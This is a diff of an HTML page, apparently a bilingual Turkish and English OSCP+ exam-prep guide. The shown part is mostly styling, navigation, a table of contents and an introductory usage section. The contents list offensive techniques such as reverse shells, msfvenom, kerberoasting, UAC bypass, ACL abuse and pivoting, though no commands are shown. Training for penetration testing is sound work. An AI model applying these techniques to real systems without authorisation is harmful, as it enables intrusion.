@@ -1,140 +1,215 @@
-<!doctype html>
-<html lang="tr">
+<!DOCTYPE html>
+<html lang="tr" data-lang="tr" class="no-js">
 <head>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<title>OSCP Ultimate Guide — OSCP+ Sınav Rehberi | Hüseyin Kalkan</title>
-<meta name="description" content="OSCP+ sınavı için kapsamlı ve etkileşimli Türkçe rehber: sınav kuralları ve puanlama, strateji ve zaman yönetimi, keşif, web, Active Directory ve yetki yükseltme metodolojisi, kopyalanabilir komutlar.">
-<meta name="author" content="Hüseyin Kalkan">
-<meta name="theme-color" content="#fbfaf8">
-<link rel="canonical" href="https://huseyinkalkan.net/oscp-ultimate-guide/">
-<link rel="icon" href="/assets/favicon.svg" type="image/svg+xml">
-<link rel="icon" href="/favicon.ico" sizes="48x48">
-<link rel="apple-touch-icon" href="/assets/apple-touch-icon.png">
-<link rel="manifest" href="/site.webmanifest">
-<meta property="og:type" content="article">
-<meta property="og:site_name" content="huseyinkalkan.net">
-<meta property="og:title" content="OSCP Ultimate Guide — OSCP+ Sınav Rehberi">
-<meta property="og:description" content="OSCP+ sınavı için kapsamlı ve etkileşimli Türkçe rehber.">
-<meta property="og:url" content="https://huseyinkalkan.net/oscp-ultimate-guide/">
-<meta property="og:locale" content="tr_TR">
-<meta name="twitter:card" content="summary">
-<style>
-:root{
-  --bg:#fbfaf8; --panel:#f2f0ec; --text:#1d1d1f; --muted:#5f5f66; --line:#dddad3;
-  --accent:#b4361f; --accent-soft:#f6e3de; --code-bg:#1e1f24; --code-text:#e6e6e6;
-  --ph:#ffcf5c; --tip:#e7f2ea; --tip-line:#2f7d4f; --warn:#fff4dc; --warn-line:#b07a00;
-  --danger:#fbe7e5; --danger-line:#b4361f;
-}
-@media (prefers-color-scheme: dark){
-  :root:not([data-theme="light"]){
-    --bg:#16171b; --panel:#1d1f24; --text:#e8e6e3; --muted:#a3a3ab; --line:#2e3037;
-    --accent:#ff7a5c; --accent-soft:#3a221d; --code-bg:#0f1013; --code-text:#e6e6e6;
-    --tip:#16271d; --tip-line:#4fbf7f; --warn:#2c2512; --warn-line:#e0b040;
-    --danger:#2e1a18; --danger-line:#ff7a5c;
-  }
-}
-:root[data-theme="dark"]{
-  --bg:#16171b; --panel:#1d1f24; --text:#e8e6e3; --muted:#a3a3ab; --line:#2e3037;
-  --accent:#ff7a5c; --accent-soft:#3a221d; --code-bg:#0f1013; --code-text:#e6e6e6;
-  --tip:#16271d; --tip-line:#4fbf7f; --warn:#2c2512; --warn-line:#e0b040;
-  --danger:#2e1a18; --danger-line:#ff7a5c;
-}
-*{box-sizing:border-box}
-html{scroll-behavior:smooth; scroll-padding-top:16px}
-body{margin:0;background:var(--bg);color:var(--text);
-  font:15.5px/1.6 "Inter","Segoe UI",system-ui,-apple-system,sans-serif}
-code,pre{font-family:"JetBrains Mono","Fira Code","DejaVu Sans Mono",ui-monospace,monospace}
-a{color:var(--accent)}
-.layout{display:grid;grid-template-columns:300px minmax(0,1fr);min-height:100vh}
-nav.side{position:sticky;top:0;height:100vh;overflow:auto;background:var(--panel);
-  border-right:1px solid var(--line);padding:20px 16px 40px;font-size:13.5px}
-nav.side .brand{font-weight:700;font-size:16px;margin-bottom:2px}
-nav.side .sub{color:var(--muted);font-size:12px;margin-bottom:14px}
-nav.side ul{list-style:none;margin:0;padding:0}
-nav.side > .toc > ul > li{margin:10px 0 2px}
-nav.side > .toc > ul > li > a{font-weight:650;color:var(--text)}
-nav.side ul ul{padding-left:10px;border-left:1px solid var(--line);margin:4px 0 0 2px}
-nav.side ul ul a{color:var(--muted)}
-nav.side a{text-decoration:none;display:block;padding:2px 6px;border-radius:5px}
-nav.side a:hover,nav.side a.active{background:var(--accent-soft);color:var(--accent)}
-.tools{display:grid;gap:8px;margin-bottom:14px}
-.tools label{font-size:11.5px;color:var(--muted);display:block;margin-bottom:2px}
-.tools input{width:100%;padding:7px 9px;border:1px solid var(--line);border-radius:7px;
-  background:var(--bg);color:var(--text);font:13px "JetBrains Mono",monospace}
-.tools .row{display:flex;gap:6px}
-.tools button{flex:1;padding:6px;border:1px solid var(--line);border-radius:7px;background:var(--bg);
-  color:var(--text);cursor:pointer;font-size:12px}
-main{padding:36px clamp(16px,5vw,64px) 80px;max-width:1100px}
-header.hero{border-bottom:2px solid var(--accent);padding-bottom:18px;margin-bottom:10px}
-header.hero h1{font-size:34px;margin:0 0 6px;letter-spacing:-.5px}
-header.hero p{margin:0;color:var(--muted)}
-h1{font-size:27px;margin:56px 0 12px;padding-top:8px;border-top:1px solid var(--line);letter-spacing:-.3px}
-h2{font-size:20px;margin:34px 0 10px}
-h3{font-size:16.5px;margin:22px 0 8px}
-p,li{max-width:80ch}
-table{border-collapse:collapse;width:100%;margin:12px 0 18px;font-size:14px;display:block;overflow-x:auto}
-th,td{border:1px solid var(--line);padding:6px 10px;text-align:left;vertical-align:top}
-th{background:var(--panel);font-weight:650}
-td code,li code,p code{background:var(--panel);padding:1px 5px;border-radius:4px;font-size:.88em;word-break:break-word}
-.codewrap{position:relative;margin:10px 0 16px}
-pre{background:var(--code-bg);color:var(--code-text);padding:14px 16px;border-radius:9px;overflow-x:auto;
-  font-size:13px;line-height:1.5;margin:0}
-pre code{background:none;padding:0}
-.copy{position:absolute;top:7px;right:7px;font-size:11.5px;padding:3px 9px;border-radius:6px;
-  border:1px solid #444;background:#2b2d33;color:#ddd;cursor:pointer;opacity:.75}
-.copy:hover{opacity:1}
-.ph{color:var(--ph);font-weight:600}
-.admonition{border-left:4px solid var(--tip-line);background:var(--tip);padding:10px 14px;border-radius:7px;margin:14px 0}
-.admonition.warning{border-color:var(--warn-line);background:var(--warn)}
-.admonition.danger{border-color:var(--danger-line);background:var(--danger)}
-.admonition-title{font-weight:700;margin:0 0 4px}
-.admonition p{margin:4px 0}
-blockquote{border-left:4px solid var(--accent);margin:24px 0;padding:6px 16px;color:var(--muted);font-style:italic}
-hr{border:0;margin:0}
-.hidden{display:none!important}
-#menu{display:none}
-@media (max-width:900px){
-  .layout{display:block}
-  nav.side{position:fixed;inset:0 25% 0 0;z-index:10;transform:translateX(-105%);transition:transform .2s;height:100vh}
-  nav.side.open{transform:none;box-shadow:0 0 40px #0006}
-  #menu{display:block;position:fixed;right:14px;bottom:14px;z-index:11;padding:10px 14px;border-radius:999px;
-    border:1px solid var(--line);background:var(--accent);color:#fff;font-weight:650}
-  main{padding-top:20px}
-}
-@media print{
-  nav.side,#menu,.copy{display:none!important}
-  .layout{display:block}
-  main{max-width:none;padding:0}
-  body{background:#fff;color:#000;font-size:10.5pt}
-  pre{white-space:pre-wrap;word-break:break-all;background:#f4f4f4;color:#000;border:1px solid #ccc;font-size:8.5pt}
-  .ph{color:#000;text-decoration:underline}
-  h1{page-break-before:always;border-top:0;margin-top:0}
-  header.hero + h1{page-break-before:avoid}
-  h1,h2,h3{page-break-after:avoid}
-  pre,table,.admonition{page-break-inside:avoid}
-  table{display:table}
-  a{color:#000;text-decoration:none}
-}
-.backsite{display:inline-block;margin-bottom:10px;font-size:.82rem;font-weight:600;
-  color:var(--muted);text-decoration:none;border:1px solid var(--line);
-  border-radius:999px;padding:4px 11px;transition:color .15s,border-color .15s}
-.backsite:hover{color:var(--accent);border-color:var(--accent)}
-</style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <script>
+    (function () {
+      var r = document.documentElement;
+      r.className = r.className.replace(/\bno-js\b/, '');
+      try {
+        var l = localStorage.getItem('site_lang');
+        if (l === 'en' || l === 'tr') { r.setAttribute('data-lang', l); r.setAttribute('lang', l); }
+      } catch (e) {}
+    })();
+  </script>
+
+  <title>OSCP Ultimate Guide — OSCP+ Sınav Rehberi | Hüseyin Kalkan</title>
+  <meta name="description" content="OSCP Ultimate Guide: OSCP+ sınavı için Türkçe ve İngilizce, etkileşimli rehber. Kurallar ve puanlama, strateji, keşif, web, Active Directory, yetki yükseltme, pivoting ve rapor; kopyalanabilir komutlar.">
+  <meta name="author" content="Hüseyin Kalkan">
+  <meta name="theme-color" content="#080a0f">
+  <link rel="canonical" href="https://huseyinkalkan.net/oscp-ultimate-guide/">
+
+  <meta property="og:type" content="article">
+  <meta property="og:site_name" content="huseyinkalkan.net">
+  <meta property="og:title" content="OSCP Ultimate Guide — OSCP+ Exam Guide">
+  <meta property="og:description" content="An interactive OSCP+ exam guide in Turkish and English: rules, strategy, enumeration, web, Active Directory, privilege escalation, pivoting and reporting.">
+  <meta property="og:url" content="https://huseyinkalkan.net/oscp-ultimate-guide/">
+  <meta property="og:locale" content="tr_TR">
+  <meta property="og:locale:alternate" content="en_US">
+  <meta name="twitter:card" content="summary">
+
+  <link rel="icon" href="/assets/favicon.svg" type="image/svg+xml">
+  <link rel="icon" href="/favicon.ico" sizes="48x48">
+  <link rel="apple-touch-icon" href="/assets/apple-touch-icon.png">
+  <link rel="manifest" href="/site.webmanifest">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@500;600;700&display=swap">
+  <link rel="stylesheet" href="/assets/css/style.css">
+  <style>
+    /* ---- OSCP rehberi: sitenin koyu temasi uzerinde iki sutunlu yerlesim ---- */
+    .guide { display: grid; grid-template-columns: 290px minmax(0, 1fr); max-width: 1440px; margin: 0 auto; }
+    .guide nav.side {
+      position: sticky; top: var(--header-h); height: calc(100vh - var(--header-h)); overflow-y: auto;
+      padding: 22px 16px 48px; border-right: 1px solid var(--border-soft); font-size: .84rem; scrollbar-width: thin;
+    }
+    .side .brand { font-weight: 700; font-size: 1rem; color: var(--text); letter-spacing: -.01em; }
+    .side .sub { color: var(--text-dim); font-family: var(--font-mono); font-size: .7rem; margin: 3px 0 16px; }
+    .side .tools { display: grid; gap: 10px; margin-bottom: 18px; }
+    .side label { display: block; font-size: .72rem; color: var(--text-muted); margin-bottom: 4px; line-height: 1.4; }
+    .side input {
+      width: 100%; padding: 8px 10px; border: 1px solid var(--border); border-radius: var(--radius-sm);
+      background: var(--card); color: var(--text); font: 500 .8rem var(--font-mono);
+    }
+    .side input:focus { outline: none; border-color: var(--accent); }
+    .side .tool-btn {
+      padding: 7px 10px; border: 1px solid var(--border); border-radius: var(--radius-sm); background: var(--card);
+      color: var(--text-muted); cursor: pointer; font: 600 .75rem var(--font-sans);
+    }
+    .side .tool-btn:hover { border-color: var(--accent); color: var(--text); }
+    .toc ul { list-style: none; }
+    .toc > ul > li { margin: 10px 0 2px; }
+    .toc > ul > li > a { font-weight: 650; color: var(--text); }
+    .toc ul ul { padding-left: 10px; border-left: 1px solid var(--border); margin: 4px 0 0 6px; }
+    .toc ul ul a { color: var(--text-muted); }
+    .toc a { display: block; padding: 3px 8px; border-radius: 6px; line-height: 1.4; }
+    .toc a:hover, .toc a.active { background: rgba(91, 157, 255, .1); color: var(--accent); }
+
+    .guide-main { padding: 36px clamp(18px, 4vw, 56px) 24px; min-width: 0; max-width: 1080px; }
+    .guide-hero { padding: 6px 0 24px; border-bottom: 1px solid var(--border); }
+    .guide-hero .eyebrow { margin-bottom: 16px; }
+    .guide-hero .guide-title {
+      font-size: clamp(1.9rem, 4.6vw, 2.8rem); line-height: 1.12; letter-spacing: -.035em; font-weight: 800;
+      margin: 0 0 14px; padding: 0; border: 0;
+      background: linear-gradient(135deg, #ffffff 25%, #9bc2ff 75%, var(--accent-2));
+      -webkit-background-clip: text; background-clip: text; color: transparent;
+    }
+    .guide-hero .lead { color: var(--text-muted); max-width: 70ch; margin: 0 0 10px; }
+    .guide-hero .lead strong { color: var(--text); }
+
+    .guide-body > h1 {
+      font-size: 1.6rem; font-weight: 750; letter-spacing: -.025em; line-height: 1.25;
+      margin: 52px 0 16px; padding-top: 26px; border-top: 1px solid var(--border-soft);
+    }
+    .guide-body > h1:first-of-type { border-top: 0; margin-top: 28px; padding-top: 0; }
+    .guide-body > h2 { font-size: 1.2rem; font-weight: 700; letter-spacing: -.015em; line-height: 1.3; margin: 36px 0 12px; }
+    .guide-body h3 { font-size: 1.02rem; font-weight: 650; margin: 24px 0 8px; }
+    .guide-body p, .guide-body li { color: #cdd6e4; max-width: 82ch; }
+    .guide-body p { margin: 0 0 12px; }
+    .guide-body ul, .guide-body ol { padding-left: 22px; margin: 0 0 14px; }
+    .guide-body li { margin: 4px 0; }
+    .guide-body li::marker { color: var(--accent); }
+    .guide-body strong { color: var(--text); font-weight: 650; }
+    .guide-body hr { display: none; }
+    .guide-body table {
+      display: block; overflow-x: auto; width: 100%; margin: 14px 0 20px;
+      border: 1px solid var(--border); border-radius: var(--radius-sm); font-size: .88rem;
+    }
+    .guide-body th, .guide-body td {
+      white-space: normal; vertical-align: top; padding: 9px 14px; border-bottom: 1px solid var(--border-soft); min-width: 96px;
+    }
+    .guide-body th { text-transform: none; letter-spacing: 0; font-family: var(--font-sans); font-size: .8rem; color: var(--text); }
+    .guide-body td code { white-space: normal; word-break: break-word; }
+    .guide-body p code, .guide-body li code { overflow-wrap: anywhere; }
+    .codewrap { position: relative; margin: 12px 0 18px; }
+    .codewrap pre { margin: 0; }
+    .copy {
+      position: absolute; top: 8px; right: 8px; padding: 4px 10px; border-radius: 6px; cursor: pointer;
+      border: 1px solid var(--border); background: var(--card); color: var(--text-muted);
+      font: 600 .7rem var(--font-sans); opacity: .85;
+    }
+    .copy:hover { opacity: 1; color: var(--text); border-color: var(--accent); }
+    .ph { color: #ffcf5c; font-weight: 600; }
+    .admonition {
+      border: 1px solid rgba(52, 211, 153, .25); border-left: 3px solid var(--ok); background: rgba(52, 211, 153, .06);
+      padding: 12px 16px; border-radius: var(--radius-sm); margin: 16px 0;
+    }
+    .admonition.warning { border-color: rgba(251, 191, 36, .28); border-left-color: #fbbf24; background: rgba(251, 191, 36, .06); }
+    .admonition.danger { border-color: rgba(248, 113, 113, .28); border-left-color: var(--danger); background: rgba(248, 113, 113, .06); }
+    .admonition .admonition-title { font-weight: 700; color: var(--text); margin: 0 0 4px; }
+    .admonition p { margin: 4px 0; }
+    .guide-body blockquote {
+      border-left: 3px solid var(--accent); margin: 28px 0; padding: 10px 18px; font-style: italic;
+      background: rgba(91, 157, 255, .05); border-radius: 0 var(--radius-sm) var(--radius-sm) 0;
+    }
+    .guide-body blockquote p { color: var(--text-muted); margin: 0; }
+    .hidden { display: none !important; }
+    #menu { display: none; }
+
+    @media (max-width: 960px) {
+      .guide { display: block; }
+      .guide nav.side {
+        position: fixed; top: 0; left: 0; bottom: 0; width: min(86vw, 340px); height: 100%; z-index: 150;
+        background: var(--bg-soft); border-right: 1px solid var(--border);
+        padding-top: calc(22px + env(safe-area-inset-top, 0px));
+        transform: translateX(-105%); transition: transform .2s ease;
+      }
+      .guide nav.side.open { transform: none; box-shadow: 0 0 48px rgba(0, 0, 0, .7); }
+      #menu {
+        display: inline-flex; position: fixed; right: 16px; bottom: calc(16px + env(safe-area-inset-bottom, 0px)); z-index: 140;
+        padding: 10px 16px; border-radius: 999px; border: 1px solid rgba(91, 157, 255, .5); cursor: pointer;
+        background: var(--accent); color: #05101f; font: 700 .85rem var(--font-sans);
+        box-shadow: 0 8px 24px -8px rgba(91, 157, 255, .9);
+      }
+      .guide-main { padding-top: 24px; }
+    }
+    html.no-js .copy { display: none; }
+
+    @media print {
+      .guide nav.side, #menu, .copy { display: none !important; }
+      .guide { display: block; }
+      .guide-main { max-width: none; padding: 0; }
+      .guide-hero .guide-title { color: #000; background: none; }
+      .guide-body p, .guide-body li, .guide-body td { color: #000; }
+      pre { white-space: pre-wrap; word-break: break-all; background: #f4f4f4; border: 1px solid #ccc; }
+      pre code, code { color: #000; background: none; }
+      .ph { color: #000; text-decoration: underline; }
+      .guide-body > h1 { page-break-before: always; border-top: 0; margin-top: 0; }
+      .guide-body > h1:first-of-type { page-break-before: avoid; }
+      .guide-body h1, .guide-body h2 { page-break-after: avoid; }
+      pre, table, .admonition { page-break-inside: avoid; }
+      .guide-body table { display: table; }
+    }
+  </style>
 </head>
 <body>
-<div class="layout">
-<nav class="side" id="side">
-  <a class="backsite" href="/">&larr; huseyinkalkan.net</a>
-  <div class="brand">OSCP+ Sınav Rehberi</div>
-  <div class="sub">v2.1 · kurallar 31.10.2026 itibarıyla doğrulandı</div>
-  <div class="tools">
-    <div><label for="lhost">LHOST (hedefe yapıştırılan komutlarda yerine konur)</label>
-      <input id="lhost" placeholder="ör. 192.168.45.201" autocomplete="off"></div>
-    <div><label for="q">Ara (bölüm filtrele)</label><input id="q" placeholder="kerberoast, suid, chisel…" autocomplete="off"></div>
-    <div class="row"><button id="theme" type="button">Tema</button><button type="button" onclick="window.print()">Yazdır / PDF</button></div>
-  </div>
-  <div class="toc"><div class="toc">
+
+  <a class="skip-link" href="#main"><span class="t-tr">İçeriğe atla</span><span class="t-en" lang="en">Skip to content</span></a>
+
+  <header class="site-header">
+    <div class="container">
+      <nav class="nav" aria-label="Ana menü">
+        <a href="/" class="logo">
+          <svg class="logo-mark" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linejoin="round" aria-hidden="true">
+            <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
+          </svg>
+          <span>huseyinkalkan.net</span><span class="caret" aria-hidden="true">_</span>
+        </a>
+
+        <button class="nav-toggle" type="button" id="nav-toggle" aria-expanded="false" aria-controls="nav-links" aria-label="Menü">
+          <svg class="icon-open" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" aria-hidden="true"><path d="M3 6h18M3 12h18M3 18h18"/></svg>
+          <svg class="icon-close" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" aria-hidden="true"><path d="M18 6 6 18M6 6l12 12"/></svg>
+        </button>
+
+        <div class="nav-links" id="nav-links">
+          <a href="/"><span class="t-tr">Hakkımda</span><span class="t-en" lang="en">About</span></a>
+          <a href="/pentest.html">Pentest</a>
+          <a href="/oscp-ultimate-guide/" aria-current="page">OSCP Ultimate Guide</a>
+          <a href="/bug-bounty.html">Bug Bounty</a>
+          <a href="/blog/">Blog</a>
+          <button id="lang-btn" class="lang-btn" type="button">TR</button>
+        </div>
+      </nav>
+    </div>
+  </header>
+
+  <div class="guide">
+    <nav class="side" id="side" aria-label="İçindekiler / Contents">
+      <div class="brand"><span class="t-tr">OSCP+ Sınav Rehberi</span><span class="t-en" lang="en">OSCP+ Exam Guide</span></div>
+      <div class="sub"><span class="t-tr">v2.1 · kurallar 31.10.2026 itibarıyla doğrulandı</span><span class="t-en" lang="en">v2.1 · rules verified as of 31 Oct 2026</span></div>
+      <div class="tools">
+        <div>
+          <label for="lhost"><span class="t-tr">LHOST (hedefe yapıştırılan komutlarda yerine konur)</span><span class="t-en" lang="en">LHOST (substituted into commands you paste on the target)</span></label>
+          <input id="lhost" placeholder="192.168.45.201" autocomplete="off" spellcheck="false">
+        </div>
+        <div>
+          <label for="q"><span class="t-tr">Ara (bölüm filtrele)</span><span class="t-en" lang="en">Search (filter sections)</span></label>
+          <input id="q" type="search" placeholder="kerberoast, suid, chisel…" autocomplete="off" spellcheck="false">
+        </div>
+        <button id="print-btn" class="tool-btn" type="button"><span class="t-tr">Yazdır / PDF</span><span class="t-en" lang="en">Print / PDF</span></button>
+      </div>
+      <div class="toc t-tr">
 <ul>
 <li><a href="#0-bu-belge-nasıl-kullanılır">0. Bu belge nasıl kullanılır</a></li>
 <li><a href="#1-oscp-sınav-kuralları-ve-puanlama">1. OSCP+ sınav kuralları ve puanlama</a><ul>
@@ -259,14 +334,145 @@ hr{border:0;margin:0}
 </ul>
 </li>
 </ul>
-</div>
-</div>
-</nav>
-<main>
-<header class="hero">
-  <h1 style="border:0;margin:0 0 6px;padding:0">OSCP+ Sınav Rehberi</h1>
-  <p>Kurallar · Strateji · Keşif · Web · Parolalar · Kabuklar · Transfer · Linux/Windows privesc · Active Directory · Pivoting · Rapor</p>
-</header>
+      </div>
+      <div class="toc t-en" lang="en">
+<ul>
+<li><a href="#en-how-to-use">0. How to use this guide</a></li>
+<li><a href="#en-exam-rules">1. OSCP+ exam rules and scoring</a><ul>
+<li><a href="#en-exam-structure">1.1 Exam structure</a></li>
+<li><a href="#en-points-math">1.2 The 70-point math (exams up to 30 November 2026)</a></li>
+<li><a href="#en-restrictions">1.3 Restrictions (things that can zero your score)</a></li>
+<li><a href="#en-scoring-conditions">1.4 When points are awarded</a></li>
+<li><a href="#en-point-loss">1.5 Common ways to lose points</a></li>
+</ul>
+</li>
+<li><a href="#en-strategy">2. Strategy, time and note discipline</a><ul>
+<li><a href="#en-time-plan">2.1 Time plan (09:00 start example)</a></li>
+<li><a href="#en-setup">2.2 Environment setup (once)</a></li>
+<li><a href="#en-note-template">2.3 Note template (copy for every target)</a></li>
+<li><a href="#en-thirty-minutes">2.4 The 30-minute rule (when you are stuck)</a></li>
+<li><a href="#en-credential-reuse">2.5 Credential reuse matrix</a></li>
+</ul>
+</li>
+<li><a href="#en-recon">3. Recon and service enumeration</a><ul>
+<li><a href="#en-nmap">3.1 Nmap — one workflow</a></li>
+<li><a href="#en-port-first">3.2 Port → first things to do</a></li>
+<li><a href="#en-ftp">3.3 FTP (21)</a></li>
+<li><a href="#en-smb">3.4 SMB / RPC (139, 445)</a></li>
+<li><a href="#en-snmp">3.5 SNMP (161/udp)</a></li>
+<li><a href="#en-ldap">3.6 LDAP / Kerberos (389, 88)</a></li>
+<li><a href="#en-misc-services">3.7 NFS, SMTP, DNS, databases, Redis</a></li>
+</ul>
+</li>
+<li><a href="#en-web">4. Web applications</a><ul>
+<li><a href="#en-web-priority">4.1 Web priority order</a></li>
+<li><a href="#en-content-discovery">4.2 Content and vhost discovery</a></li>
+<li><a href="#en-default-creds">4.3 Default credentials</a></li>
+<li><a href="#en-sqli">4.4 SQL injection (manual — sqlmap is banned in the exam)</a></li>
+<li><a href="#en-lfi">4.5 Directory traversal / LFI / RFI</a></li>
+<li><a href="#en-upload">4.6 File upload bypass</a></li>
+<li><a href="#en-cmdi">4.7 Command injection</a></li>
+<li><a href="#en-ssti">4.8 SSTI</a></li>
+<li><a href="#en-xss-xxe-ssrf">4.9 XSS, XXE, SSRF (short)</a></li>
+<li><a href="#en-known-apps">4.10 Known applications and classic CVEs</a></li>
+<li><a href="#en-exploits">4.11 Finding and adapting exploits</a></li>
+<li><a href="#en-client-side">4.12 Client-side attacks (e-mail / phishing scenario)</a></li>
+</ul>
+</li>
+<li><a href="#en-passwords">5. Passwords and hashes</a><ul>
+<li><a href="#en-brute">5.1 Brute force and spraying</a></li>
+<li><a href="#en-hash-types">5.2 Hash types</a></li>
+<li><a href="#en-2john">5.3 File passwords (*2john)</a></li>
+</ul>
+</li>
+<li><a href="#en-shells">6. Shells</a><ul>
+<li><a href="#en-revshells">6.1 Reverse shell catalogue</a></li>
+<li><a href="#en-msfvenom">6.2 msfvenom (allowed on every machine — except Meterpreter)</a></li>
+<li><a href="#en-tty">6.3 Linux TTY upgrade</a></li>
+<li><a href="#en-win-shell">6.4 Better shells on Windows</a></li>
+<li><a href="#en-no-shell">6.5 When the reverse shell does not arrive</a></li>
+</ul>
+</li>
+<li><a href="#en-transfer">7. File transfer</a><ul>
+<li><a href="#en-kali-servers">7.1 Servers on Kali (always running in tmux window 0)</a></li>
+<li><a href="#en-kali-to-target">7.2 Kali → target</a></li>
+<li><a href="#en-target-to-kali">7.3 Target → Kali</a></li>
+</ul>
+</li>
+<li><a href="#en-linux-privesc">8. Linux privilege escalation</a><ul>
+<li><a href="#en-linux-checklist">8.1 Ordered checklist (5 min manual first, then linpeas)</a></li>
+<li><a href="#en-sudo">8.2 sudo</a></li>
+<li><a href="#en-suid">8.3 SUID and capabilities</a></li>
+<li><a href="#en-cron">8.4 Cron and scheduled jobs</a></li>
+<li><a href="#en-linux-groups">8.5 Groups</a></li>
+<li><a href="#en-nfs">8.6 NFS no_root_squash</a></li>
+<li><a href="#en-kernel">8.7 Kernel and known local CVEs (last resort)</a></li>
+<li><a href="#en-linux-decision">8.8 Linux privesc decision table</a></li>
+</ul>
+</li>
+<li><a href="#en-windows-privesc">9. Windows privilege escalation</a><ul>
+<li><a href="#en-windows-checklist">9.1 Ordered checklist</a></li>
+<li><a href="#en-cred-hunting">9.2 Credential hunting (the most productive Windows privesc)</a></li>
+<li><a href="#en-services">9.3 Services</a></li>
+<li><a href="#en-tasks">9.4 Scheduled tasks and AlwaysInstallElevated</a></li>
+<li><a href="#en-privileges">9.5 Privileges (whoami /priv)</a></li>
+<li><a href="#en-windows-groups">9.6 Groups</a></li>
+<li><a href="#en-uac">9.7 UAC bypass (Administrators member + Medium integrity)</a></li>
+<li><a href="#en-post-admin">9.8 After Admin/SYSTEM (not just the flag!)</a></li>
+<li><a href="#en-legacy">9.9 Old / unpatched systems</a></li>
+<li><a href="#en-windows-decision">9.10 Windows privesc decision table</a></li>
+<li><a href="#en-first-10">9.11 Quick reference: the first 10 minutes</a></li>
+</ul>
+</li>
+<li><a href="#en-ad">10. Active Directory (assumed breach scenario)</a><ul>
+<li><a href="#en-ad-decision">10.1 AD decision tree</a></li>
+<li><a href="#en-ad-first-15">10.2 The first 15 minutes</a></li>
+<li><a href="#en-bloodhound">10.3 BloodHound</a></li>
+<li><a href="#en-powerview">10.4 PowerView / built-in enumeration (from a target)</a></li>
+<li><a href="#en-roasting">10.5 Kerberoasting and AS-REP roasting</a></li>
+<li><a href="#en-lateral">10.6 Lateral movement</a></li>
+<li><a href="#en-mssql">10.7 MSSQL</a></li>
+<li><a href="#en-acl">10.8 ACL abuse (BloodHound edges)</a></li>
+<li><a href="#en-domain-admin">10.9 Domain Admin and proof</a></li>
+<li><a href="#en-ad-advanced">10.10 Advanced (outside the PEN-200 syllabus — short notes only)</a></li>
+<li><a href="#en-ad-mistakes">10.11 Common AD mistakes</a></li>
+</ul>
+</li>
+<li><a href="#en-pivoting">11. Pivoting</a><ul>
+<li><a href="#en-pivot-when">11.1 When</a></li>
+<li><a href="#en-ligolo">11.2 Ligolo-ng (recommended — no proxychains needed)</a></li>
+<li><a href="#en-chisel">11.3 Chisel (SOCKS + proxychains)</a></li>
+<li><a href="#en-ssh-pivot">11.4 SSH</a></li>
+<li><a href="#en-windows-pivot">11.5 Windows built-ins / when you cannot bring tools</a></li>
+</ul>
+</li>
+<li><a href="#en-report">12. Report</a><ul>
+<li><a href="#en-report-rules">12.1 Submission rules</a></li>
+<li><a href="#en-report-structure">12.2 Structure</a></li>
+<li><a href="#en-report-step">12.3 Template for every step</a></li>
+<li><a href="#en-report-plan">12.4 24-hour report plan</a></li>
+</ul>
+</li>
+<li><a href="#en-appendices">Appendices</a><ul>
+<li><a href="#en-appendix-a">Appendix A — Exam day on one page</a></li>
+<li><a href="#en-appendix-b">Appendix B — Quick proof commands</a></li>
+<li><a href="#en-appendix-c">Appendix C — Resources</a></li>
+</ul>
+</li>
+</ul>
+      </div>
+    </nav>
+
+    <main id="main" class="guide-main">
+
+      <!-- ===================== Türkçe ===================== -->
+      <div class="guide-body t-tr" id="guide-tr">
+        <header class="guide-hero">
+          <p class="eyebrow"><span class="dot" aria-hidden="true"></span>OSCP PREP · v2.1</p>
+          <h1 class="guide-title">OSCP Ultimate Guide</h1>
+          <p class="lead">OSCP+ sınavı için uçtan uca, etkileşimli rehber: <strong>kurallar ve puanlama, strateji, keşif, web, parolalar, kabuklar, dosya transferi, Linux/Windows yetki yükseltme, Active Directory, pivoting ve rapor</strong>.</p>
+          <p class="lead">Her kod bloğu tek tıkla kopyalanır. <strong>LHOST</strong> değerini sol menüye bir kez gir, tüm komutlarda yerine konsun. Hack The Box ve Proving Grounds makinelerinden lab notlarım <a href="/blog/">blogda</a>.</p>
+        </header>
 <h1 id="0-bu-belge-nasıl-kullanılır">0. Bu belge nasıl kullanılır</h1>
 <p>Üç kullanım modu var:</p>
 <ol>
@@ -2293,57 +2499,2180 @@ Output (Figure 7): uid=1(daemon) gid=1(daemon)
 <blockquote>
 <p>Bu belge bir komut listesi değil, bir karar sistemi. Takıldığında komutu değil, <strong>hangi bilgiyi henüz toplamadığını</strong> sor.</p>
 </blockquote>
-</main>
+      </div>
+
+      <!-- ===================== English ===================== -->
+      <div class="guide-body t-en" lang="en" id="guide-en">
+        <header class="guide-hero">
+          <p class="eyebrow"><span class="dot" aria-hidden="true"></span>OSCP PREP · v2.1</p>
+          <h1 class="guide-title">OSCP Ultimate Guide</h1>
+          <p class="lead">An end-to-end, interactive guide for the OSCP+ exam: <strong>rules and scoring, strategy, enumeration, web, passwords, shells, file transfer, Linux/Windows privilege escalation, Active Directory, pivoting and reporting</strong>.</p>
+          <p class="lead">Every code block copies with one click. Enter your <strong>LHOST</strong> once in the side menu and it is substituted into every command. My lab notes from Hack The Box and Proving Grounds machines are on the <a href="/blog/">blog</a>.</p>
+        </header>
+<h1 id="en-how-to-use">0. How to use this guide</h1>
+<p>There are three ways to use it:</p>
+<ol>
+<li><strong>Before the exam:</strong> read sections 1–2 end to end (rules + strategy). For every command in the other sections that you do not know, run it at least once on a lab machine. A command you try for the first time in the exam is a command that does not work.</li>
+<li><strong>During the exam:</strong> sections 3–11 are for copy and paste. Every code block has a <strong>Copy</strong> button in its top-right corner.</li>
+<li><strong>When you are stuck:</strong> the <a href="#en-thirty-minutes">30-minute rule</a>, the <a href="#en-linux-decision">Linux decision table</a>, the <a href="#en-windows-decision">Windows decision table</a> and the <a href="#en-ad-decision">AD decision tree</a>.</li>
+</ol>
